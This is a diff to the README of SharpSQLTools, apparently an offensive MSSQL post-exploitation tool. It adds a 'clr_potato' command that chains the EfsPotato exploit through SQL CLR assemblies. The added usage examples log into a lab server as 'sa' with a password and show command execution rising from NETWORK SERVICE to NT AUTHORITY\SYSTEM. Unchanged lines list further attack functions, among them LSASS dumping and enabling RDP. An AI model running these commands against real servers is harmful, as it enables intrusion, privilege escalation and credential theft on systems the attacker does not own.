@@ -6,6 +6,10 @@
 
 ### 更新日志
 
+- 2021-08-03
+  - 添加clr_potato
+  致谢[zcgonvh@EfsPotato](https://github.com/zcgonvh/EfsPotato) & [hl0rey](https://github.com/hl0rey)
+
 - 2021-07-10 
   - 修复上传bug
   - 修复clr回显bug
@@ -57,6 +61,7 @@ disable_clr                - you know what it means
 install_clr                - create assembly and procedure
 uninstall_clr              - drop clr
 clr_exec {cmd}             - for example: clr_exec whoami;clr_exec -p c:\a.exe;clr_exec -p c:\cmd.exe -a /c whoami
+clr_potato {cmd}           - exec by EfsPotato like clr_exec
 clr_combine {remotefile}   - When the upload module cannot call CMD to perform copy to merge files
 clr_dumplsass {path}       - dumplsass by clr
 clr_rdp                    - check RDP port and Enable RDP
@@ -129,6 +134,52 @@ nt service\mssql$sqlexpress
 
 nt service\mssql$sqlexpress
 
+```
+
+#### clr_potato
+
+```
+λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_potato whoami
+[*] Database connection is successful!
+Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).
+Part of GMH's fuck Tools, Code By zcgonvh.
+
+[+] Current user: NT AUTHORITY\NETWORK SERVICE
+[+] Get Token: 3352
+[+] Command : c:\Windows\System32\cmd.exe /c whoami
+[!] process with pid: 2012 created.
+==============================
+
+
+nt authority\system
+
+λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_potato -p c:\windows/system32\whoami.exe
+[*] Database connection is successful!
+Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).
+Part of GMH's fuck Tools, Code By zcgonvh.
+
+[+] Current user: NT AUTHORITY\NETWORK SERVICE
+[+] Get Token: 3084
+[+] Command : c:\windows/system32\whoami.exe
+[!] process with pid: 164 created.
+==============================
+
+
+nt authority\system
+
+λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_potato -p c:\cmd.exe -a /c whoami
+[*] Database connection is successful!
+Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).
+Part of GMH's fuck Tools, Code By zcgonvh.
+
+[+] Current user: NT AUTHORITY\NETWORK SERVICE
+[+] Get Token: 3124
+[+] Command : c:\cmd.exe   /c whoami
+[!] process with pid: 2080 created.
+==============================
+
+
+nt authority\system
 ```
 
 #### clr_scloader
@@ -289,3 +340,5 @@ https://github.com/An0nySec/ShadowUser/blob/main/ShadowUser/Program.cs#L235
 https://github.com/GhostPack/SharpDump
 
 https://gist.github.com/jfmaes/944991c40fb34625cf72fd33df1682c0
+
+https://github.com/zcgonvh/EfsPotato
